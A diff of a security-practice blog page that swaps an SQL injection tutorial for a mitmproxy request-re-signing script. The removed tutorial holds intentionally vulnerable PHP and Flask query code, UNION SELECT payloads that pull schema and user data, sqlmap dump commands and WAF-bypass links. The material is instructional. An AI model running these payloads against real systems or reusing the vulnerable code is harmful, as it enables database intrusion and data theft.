@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>sqli sqlmap工具常用参数示例 | ming&#39;s blog</title>
-  <meta name="keywords" content=" sqli ">
-  <meta name="description" content="sqli sqlmap工具常用参数示例 | ming&#39;s blog">
+  <title>mitmproxy | ming&#39;s blog</title>
+  <meta name="keywords" content="">
+  <meta name="description" content="mitmproxy | ming&#39;s blog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="安全练习生：渗透测试、代码审计、应急响应、服务加固用于记录一些常见问题的解决方案，以及一些学习过程中的弯弯绕绕。">
 <meta property="og:type" content="website">
@@ -493,34 +493,19 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-sqli" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-mitmproxy" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">sqli sqlmap工具常用参数示例</h1>
+        <h1 class="article-title">mitmproxy</h1>
     
     <div class="article-meta">
         
         
         
-        <span class="book">
-            <i class="iconfont icon-category"></i>
-            
-            
-            <a  data-rel="测试">测试</a>
-            
-        </span>
-        
-        
-        <span class="tag">
-            <i class="iconfont icon-tag"></i>
-            
-            <a class="color5">sqli</a>
-            
-        </span>
         
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2024-09-29 21:25:34'>2024-09-29 21:14</time>
+            Created At : <time class="date" title='Updated At: 2024-10-03 13:53:44'>2024-10-03 13:49</time>
         
     </div>
     <div class="article-meta">
@@ -553,7 +538,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#sqli"><span class="toc-text">sqli</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#example-%E8%84%86%E5%BC%B1%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B"><span class="toc-text">example 脆弱代码示例</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D"><span class="toc-text">查找数据库名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE%E6%89%80%E6%9C%89%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D"><span class="toc-text">查找所有数据库名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE%E6%89%80%E6%9C%89%E8%A1%A8%E5%90%8D"><span class="toc-text">查找所有表名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE%E7%89%B9%E5%AE%9A%E8%A1%A8%E7%9A%84%E6%89%80%E6%9C%89%E5%AD%97%E6%AE%B5"><span class="toc-text">查找特定表的所有字段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE%E6%89%80%E6%9C%89%E5%AD%97%E6%AE%B5%E5%8F%8A%E5%85%B6%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B"><span class="toc-text">查找所有字段及其数据类型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE%E8%A1%A8%E7%9A%84%E4%B8%BB%E9%94%AE"><span class="toc-text">查找表的主键</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF"><span class="toc-text">获取数据库用户信息</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#poc"><span class="toc-text">poc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#payloads"><span class="toc-text">payloads</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tools"><span class="toc-text">tools</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95"><span class="toc-text">基本用法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%87%E5%AE%9A%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-text">指定数据库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%89%80%E6%9C%89%E8%A1%A8"><span class="toc-text">获取所有表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%89%B9%E5%AE%9A%E8%A1%A8%E7%9A%84%E6%89%80%E6%9C%89%E5%AD%97%E6%AE%B5"><span class="toc-text">获取特定表的所有字段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE"><span class="toc-text">获取数据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-POST-%E8%AF%B7%E6%B1%82"><span class="toc-text">使用 POST 请求</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%90%86%E8%AE%BE%E7%BD%AE"><span class="toc-text">代理设置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%87%AA%E5%8A%A8%E5%8C%96%E6%A8%A1%E5%BC%8F"><span class="toc-text">自动化模式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bypass"><span class="toc-text">bypass</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#demo"><span class="toc-text">demo</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -569,111 +554,41 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="sqli"><a href="#sqli" class="headerlink" title="sqli"></a>sqli</h1><blockquote>
-<p>简谈一下 sql 注入漏洞吧，sql 注入的原理很简单和正常查询一样，只不过我们是在外部通过非正常手段执行了 sql 命令，正常是在数据库管理工具进行，增删改查等操作，而我们通过在 web 端 ，控制某传参将变量恶意修改并拼接在内部的查询语句中从而造成注入漏洞。</p>
-</blockquote>
-<h2 id="example-脆弱代码示例"><a href="#example-脆弱代码示例" class="headerlink" title="example 脆弱代码示例"></a>example 脆弱代码示例</h2><p><strong>php weak code</strong></p>
-<pre><code class="php">&lt;?php
-$servername = &quot;localhost&quot;;
-$username = &quot;username&quot;;
-$password = &quot;password&quot;;
-$dbname = &quot;database&quot;;
+        <h1 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h1><p><strong>前端加密</strong></p>
+<pre><code>import json
+import time
+import hashlib
+import uuid
+from mitmproxy import http
+import requests
+import requests
 
-$conn = new mysqli($servername, $username, $password, $dbname);
 
-$user_input = $_GET[&#39;id&#39;]; // 用户输入
+def request(flow: http.HTTPFlow) -&gt; None:
+    if flow.request.pretty_url.startswith(&quot;http://192.168.3.18/api/&quot;):
+        # 提取原始请求体
+        original_body = flow.request.content.decode(&#39;utf-8&#39;)
+        data = &#123;&quot;group&quot;: &quot;zzz&quot;, &quot;action&quot;: &quot;req&quot;, &quot;param&quot;: original_body&#125;
+        res = requests.post(&quot;http://127.0.0.1:12080/go&quot;,data=data)
+        res_json = json.loads(res.text)[&quot;data&quot;]
+        data_json = json.loads(res_json)
+        print(data_json)
+        # 对请求体进行加密处理（这里假设加密方法是简单的哈希）
+        encrypted_body = data_json[&quot;encstr&quot;]
 
-// 不安全的 SQL 查询
-$sql = &quot;SELECT * FROM users WHERE id = &#39;$user_input&#39;&quot;;
-$result = $conn-&gt;query($sql);
+        # 替换请求体
+        flow.request.text = encrypted_body
 
-if ($result-&gt;num_rows &gt; 0) &#123;
-    while ($row = $result-&gt;fetch_assoc()) &#123;
-        echo &quot;Name: &quot; . $row[&quot;name&quot;];
-    &#125;
-&#125; else &#123;
-    echo &quot;0 results&quot;;
-&#125;
-$conn-&gt;close();
-?&gt;
-</code></pre>
-<p>这段代码 用户传入 参数 <code>?id=1</code>  可控变量，这里数字1是可控的那么我们就可</p>
-<p>拼接我们的恶意传参  <code>1 UNION SELECT database(); --</code></p>
-<pre><code class="sql"># 查询数据库名称
-SELECT * FROM users WHERE id = &#39;1 UNION SELECT database(); --&#39;
-</code></pre>
-<p>以下是一些常用的 SQL 注入负载，用于查找数据库、表和字段的信息：</p>
-<h3 id="查找数据库名"><a href="#查找数据库名" class="headerlink" title="查找数据库名"></a>查找数据库名</h3><pre><code class="sql">1 UNION SELECT database(); --
-</code></pre>
-<h3 id="查找所有数据库名"><a href="#查找所有数据库名" class="headerlink" title="查找所有数据库名"></a>查找所有数据库名</h3><pre><code class="sql">1 UNION SELECT schema_name FROM information_schema.schemata; --
-</code></pre>
-<h3 id="查找所有表名"><a href="#查找所有表名" class="headerlink" title="查找所有表名"></a>查找所有表名</h3><pre><code class="sql">1 UNION SELECT table_name FROM information_schema.tables WHERE table_schema = database(); --
-</code></pre>
-<h3 id="查找特定表的所有字段"><a href="#查找特定表的所有字段" class="headerlink" title="查找特定表的所有字段"></a>查找特定表的所有字段</h3><pre><code class="sql">1 UNION SELECT column_name FROM information_schema.columns WHERE table_name = &#39;your_table_name&#39;; --
-</code></pre>
-<h3 id="查找所有字段及其数据类型"><a href="#查找所有字段及其数据类型" class="headerlink" title="查找所有字段及其数据类型"></a>查找所有字段及其数据类型</h3><pre><code class="sql">1 UNION SELECT column_name, data_type FROM information_schema.columns WHERE table_name = &#39;your_table_name&#39;; --
-</code></pre>
-<h3 id="查找表的主键"><a href="#查找表的主键" class="headerlink" title="查找表的主键"></a>查找表的主键</h3><pre><code class="sql">1 UNION SELECT column_name FROM information_schema.key_column_usage WHERE table_name = &#39;your_table_name&#39;; --
-</code></pre>
-<h3 id="获取数据库用户信息"><a href="#获取数据库用户信息" class="headerlink" title="获取数据库用户信息"></a>获取数据库用户信息</h3><pre><code class="sql">1 UNION SELECT user(), version(); --
-</code></pre>
-<p><strong>python weak code</strong></p>
-<pre><code class="python">from flask import Flask, request
-import sqlite3
+        # 生成 requestId，sign 和 timestamp
+        request_id = data_json[&quot;requestid&quot;]
+        timestamp = data_json[&quot;timestamp&quot;]
+        sign = data_json[&quot;sign&quot;]
 
-app = Flask(__name__)
-
-def get_db_connection():
-    conn = sqlite3.connect(&#39;database.db&#39;)
-    conn.row_factory = sqlite3.Row
-    return conn
-
-@app.route(&#39;/user/&lt;id&gt;&#39;)
-def get_user(id):
-    conn = get_db_connection()
-
-    # 不安全的 SQL 查询
-    sql = f&#39;SELECT * FROM users WHERE id = &#123;id&#125;&#39;
-    user = conn.execute(sql).fetchone()
-
-    conn.close()
-
-    if user is None:
-        return &#39;User not found!&#39;
-    return f&#39;Name: &#123;user[&quot;name&quot;]&#125;&#39;
-
-if __name__ == &#39;__main__&#39;:
-    app.run()
+        # 添加或替换请求头
+        flow.request.headers[&quot;requestId&quot;] = request_id
+        flow.request.headers[&quot;timestamp&quot;] = str(timestamp)
+        flow.request.headers[&quot;sign&quot;] = sign
 </code></pre>
-<h1 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h1><p><strong>有效载荷 进行测试</strong></p>
-<h2 id="payloads"><a href="#payloads" class="headerlink" title="payloads"></a>payloads</h2><p><a target="_blank" rel="noopener" href="https://github.com/payloadbox/sql-injection-payload-list">https://github.com/payloadbox/sql-injection-payload-list</a></p>
-<h2 id="tools"><a href="#tools" class="headerlink" title="tools"></a>tools</h2><p><a target="_blank" rel="noopener" href="https://github.com/sqlmapproject/sqlmap">https://github.com/sqlmapproject/sqlmap</a></p>
-<pre><code class="bash"># 将发送的数据包拦截 存放到 req.txt, --is-dba 查看是否是管理员权限
-sqlmap -r req.txt --is-dba --batch --thread=5 --risk=2--level=3
-</code></pre>
-<p>以下是一些常用的 sqlmap 命令和参数，用于进行 SQL 注入测试：</p>
-<h3 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h3><pre><code class="bash">sqlmap -u &quot;http://target.com/page.php?id=1&quot;
-</code></pre>
-<h3 id="指定数据库"><a href="#指定数据库" class="headerlink" title="指定数据库"></a>指定数据库</h3><p><strong>列出所有数据库名称</strong></p>
-<pre><code class="bash">sqlmap -u &quot;http://target.com/page.php?id=1&quot; --dbs
-</code></pre>
-<h3 id="获取所有表"><a href="#获取所有表" class="headerlink" title="获取所有表"></a>获取所有表</h3><p><strong>指定数据库名称 获取该库中的所有表</strong></p>
-<pre><code class="bash">sqlmap -u &quot;http://target.com/page.php?id=1&quot; --tables -D database_name
-</code></pre>
-<h3 id="获取特定表的所有字段"><a href="#获取特定表的所有字段" class="headerlink" title="获取特定表的所有字段"></a>获取特定表的所有字段</h3><pre><code class="bash">sqlmap -u &quot;http://target.com/page.php?id=1&quot; --columns -D database_name -T table_name
-</code></pre>
-<h3 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h3><pre><code class="bash">sqlmap -u &quot;http://target.com/page.php?id=1&quot; --dump -D database_name -T table_name
-</code></pre>
-<h3 id="使用-POST-请求"><a href="#使用-POST-请求" class="headerlink" title="使用 POST 请求"></a>使用 POST 请求</h3><pre><code class="bash">sqlmap -u &quot;http://target.com/page.php&quot; --data &quot;param1=value1&amp;param2=value2&quot;
-</code></pre>
-<h3 id="代理设置"><a href="#代理设置" class="headerlink" title="代理设置"></a>代理设置</h3><pre><code class="bash">sqlmap -u &quot;http://target.com/page.php?id=1&quot; --proxy &quot;http://127.0.0.1:8080&quot;
-</code></pre>
-<h3 id="自动化模式"><a href="#自动化模式" class="headerlink" title="自动化模式"></a>自动化模式</h3><pre><code class="bash">sqlmap -u &quot;http://target.com/page.php?id=1&quot; --batch
-</code></pre>
-<h2 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h2><p><strong>sqlmap 自带 tamper 可以绕过一些简单的没有设防，或是过滤规则不全的注入点</strong></p>
-<p><a target="_blank" rel="noopener" href="https://github.com/sqlmapproject/sqlmap/tree/master/tamper">https://github.com/sqlmapproject/sqlmap/tree/master/tamper</a></p>
-<p><strong>针对一些云锁的自动绕过脚本，可做学习参考使用</strong></p>
-<p><a target="_blank" rel="noopener" href="https://github.com/pureqh/bypasswaf">https://github.com/pureqh/bypasswaf</a></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。与我联系email c2VjaW5mby5tQGdtYWlsLmNvbQo= </span>
